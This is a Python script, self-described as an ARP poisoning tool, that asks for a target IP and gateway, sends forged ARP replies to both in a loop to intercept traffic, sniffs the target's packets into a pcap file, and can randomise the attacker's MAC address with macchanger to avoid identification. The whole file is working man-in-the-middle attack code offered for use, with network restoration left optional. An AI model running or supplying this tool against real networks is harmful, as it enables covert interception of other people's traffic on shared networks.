import sys, os, argparse
from kamene.all import *
import threading
import time
import netifaces
import ipaddress


def main():
    set_options()
     # set our interface
    interface = input('Enter interface name:  ') or 'wlp2s0'
    conf.iface = interface
    
    # change mac
    if changeMAC:
        change_interface_mac(interface)
    else:
        pass
    
    interface_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
    if interface == 'wlp2s0':
        print(f'[!] Defaulting to interface \'{interface}\' ')
    else:
        print(f'[!] Selected interface: {interface} ')

    print('    Interface MAC: ' + interface_mac)
    print('\n')
    
    tgt_ip = input('Enter target ip address: ') or '192.168.1.21'
    tgt_gateway = input('Enter target gateway ip: ') or get_tgt_gateway_ip(interface)
    
    packet_count = 1000

    # turn off output
    conf.verb = 1


    print(f'[*] Obtaining MAC for network gateway {tgt_gateway}...')
    tgt_gateway_mac = get_mac(tgt_gateway)
    if tgt_gateway_mac is None:
        print(f'[!!!] Failed to get MAC for network gateway \'{tgt_gateway}\'. Exiting...')
        sys.exit(0)
    else:
        print("[-]Gateway %s is at %s \n" % (tgt_gateway, tgt_gateway_mac))


    print(f'[*]Obtaining MAC for target ip {tgt_ip}...')
    tgt_mac = get_mac(tgt_ip)
    if tgt_mac is None:
        print("[!!!] Failed to get target MAC. Exiting...")
        sys.exit(0)
    else:
        print("[-]Target %s is at %s \n" % (tgt_ip, tgt_mac))

    # start poison thread
    global poisoning
    poisoning = True
    
    poison_thread = threading.Thread(target=poison_target,
                                    args=(tgt_gateway,
                                        tgt_gateway_mac,
                                        tgt_ip,
                                        tgt_mac)
                                    )
    poison_thread.start()

    try:
        print("[*] Starting sniffer for %d packets" % packet_count)
        bpf_filter = "ip host %s" % tgt_ip
        packets = sniff(count=packet_count,
                        filter=bpf_filter,
                        iface=interface
                        )
        # write out the captured packets
        print("[*] Writing packets to arper.pcap")
        wrpcap('arper.pcap', packets)

    except KeyboardInterrupt:
        pass

    finally:
        poisoning = False
        # wait for poisoning thread to exit
        time.sleep(2)

        # restore the network
        if restore:
            restore_target(tgt_gateway,
                        tgt_gateway_mac,
                        tgt_ip,
                        tgt_mac
                        )
        sys.exit(0)

def set_options():
    global changeMAC
    global restore
    parser = argparse.ArgumentParser(prog="ARPer", description="ARP poisoning tool")
    parser.add_argument('-c','--changemac', action='store_true', dest='changeMAC', help='Change interface MAC')
    parser.add_argument('-r','--restore', action='store_true', dest='restore', help='Restore ARP')
    
    changeMAC = parser.parse_args().changeMAC
    if changeMAC:
        print('\n[!] Option -changemac selected')
    restore = parser.parse_args().restore
    if restore:
        print('\n[!] Option -restore selected. ARP will be restored')
    
    
def change_interface_mac(interface):
    os.system(
            'echo [*] Changing MAC for interface ' + interface + '...' +
            '&& sudo ip link set dev ' + interface + ' down'+
            '&& sudo macchanger -b -r ' + interface +
            '&& sudo ip link set dev ' + interface + ' up'
            )

def get_tgt_gateway_ip(interface):
    # get broadcast_address and subnet mask for interface
    broadcast_address = ipaddress.IPv4Interface(str(netifaces.ifaddresses(interface).get(2)[0].get('broadcast')
                        + '/' +
                        netifaces.ifaddresses(interface).get(2)[0].get('netmask')))
    # return CIDR address
    return broadcast_address.with_prefixlen
  


def get_mac(tgt_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=tgt_ip)
    packet.show()
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    recieved = srp(packet, timeout=2)
    for _, r in resp:
        return r[Ether].src
    return None



def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    poison_tgt = ARP()
    poison_tgt.op = 2
    poison_tgt.psrc = gateway_ip
    poison_tgt.pdst = target_ip
    poison_tgt.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_tgt)
        send(poison_gateway)
        time.sleep(2)

    print("[*] ARP poison attack finished.")

    return

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print("[*] Restoring target...")
    sendp(ARP(op=2,
             psrc=gateway_ip,
             pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac),
         count=5)
    sendp(ARP(op=2,
             psrc=target_ip,
             pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=target_mac),
         count=5)

if __name__ == "__main__":
    main()